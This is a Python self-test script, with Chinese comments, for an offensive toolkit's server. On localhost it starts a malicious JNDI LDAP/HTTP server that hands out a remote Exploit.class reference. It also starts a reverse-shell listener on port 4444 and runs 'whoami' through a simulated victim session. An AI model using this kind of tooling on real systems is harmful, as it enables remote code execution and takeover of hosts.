# -*- coding: utf-8 -*-
"""gui_server 自测：JNDI(LDAP+HTTP) / 回调 / 反弹监听"""
import json
import socket
import time
import urllib.request

BASE = "http://127.0.0.1:8899"


def post(path, obj):
    r = urllib.request.Request(BASE + path, method="POST",
                               data=json.dumps(obj).encode(),
                               headers={"Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(r, timeout=30).read().decode())


def get(path):
    return json.loads(urllib.request.urlopen(BASE + path, timeout=20).read().decode())


def tlen(n):
    return bytes([n]) if n < 0x80 else b"\x82" + n.to_bytes(2, "big")


def seq(b):
    return b"\x30" + tlen(len(b)) + b


def octstr(b):
    return b"\x04" + tlen(len(b)) + b


print("== 1. 启动 JNDI ==")
r = post("/api/jndi", {"action": "start", "cmd": "echo deserkit-pwned",
                       "lhost": "127.0.0.1", "ldap_port": 1389,
                       "http_port": 8000, "factory": "Exploit"})
print(json.dumps(r, ensure_ascii=False))
assert r["ok"], r
time.sleep(0.5)

print("== 2. LDAP Bind ==")
s = socket.create_connection(("127.0.0.1", 1389), timeout=8)
inner = b"\x02\x01\x03" + octstr(b"cn=x") + b"\x80\x00"
bind = b"\x60" + tlen(len(inner)) + inner
msg = seq(b"\x02\x01\x01" + bind)
s.sendall(msg)
resp = s.recv(4096)
print("响应:", resp.hex(), "含BindResponse(0x61):", b"\x61" in resp)
assert b"\x61" in resp

print("== 3. LDAP Search（下发 JNDI 引用）==")
inner = octstr(b"") + b"\x0a\x01\x02" + b"\x0a\x01\x00" + b"\x02\x01\x00" + b"\x02\x01\x00" + b"\x01\x01\x00" + octstr(b"(objectClass=*)") + b"\x30\x00"
srch = b"\x63" + tlen(len(inner)) + inner
s.sendall(seq(b"\x02\x01\x02" + srch))
time.sleep(0.4)
data = b""
s.settimeout(3)
try:
    while True:
        d = s.recv(8192)
        if not d:
            break
        data += d
except socket.timeout:
    pass
print("响应长度", len(data))
print("含 javaCodeBase:", b"javaCodeBase" in data)
print("含 javaFactory:", b"javaFactory" in data)
print("含 SearchResEntry(0x64):", b"\x64" in data)
assert b"javaCodeBase" in data and b"javaFactory" in data
s.close()

print("== 4. HTTP 下载 Exploit.class ==")
try:
    r2 = urllib.request.urlopen("http://127.0.0.1:8000/Exploit.class", timeout=8)
    head = r2.read(4)
    print("magic:", head.hex(), "是class文件:", head == b"\xca\xfe\xba\xbe")
    assert head == b"\xca\xfe\xba\xbe"
except Exception as e:
    print("下载失败:", e)

print("== 5. 回调记录 ==")
try:
    urllib.request.urlopen(BASE + "/cb/test-marker", timeout=8).read()
except Exception as e:
    print("回调请求异常:", e)
time.sleep(0.3)
st = get("/api/status")
print("回调数:", len(st["callbacks"]), st["callbacks"][-1:])

print("== 6. 反弹监听 ==")
r3 = post("/api/listener", {"action": "start", "port": 4444})
print(json.dumps(r3, ensure_ascii=False))
time.sleep(0.4)
c = socket.create_connection(("127.0.0.1", 4444), timeout=5)   # 模拟目标上线
time.sleep(0.5)
st = get("/api/status")
print("会话:", st["sessions"])
assert st["sessions"], "未识别到会话"
sid = st["sessions"][0]["sid"]


def reader():
    # 模拟被控端：收到命令后回显
    buf = b""
    c.settimeout(6)
    while True:
        try:
            d = c.recv(4096)
        except socket.timeout:
            break
        if not d:
            break
        buf += d
        if b"\n" in buf:
            line, buf = buf.split(b"\n", 1)
            c.sendall(line.upper() + b"\n")   # 把命令转大写返回，便于验证
            break
    return


import threading
threading.Thread(target=reader, daemon=True).start()
r4 = post("/api/shellcmd", {"sid": sid, "cmd": "whoami"})
print("shellcmd 返回:", json.dumps(r4, ensure_ascii=False))
assert "WHOAMI" in r4.get("output", ""), r4
c.close()

print("== 7. 停止服务 ==")
print(json.dumps(post("/api/listener", {"action": "stop"}), ensure_ascii=False))
print(json.dumps(post("/api/jndi", {"action": "stop"}), ensure_ascii=False))
print("\nALL TESTS PASSED")
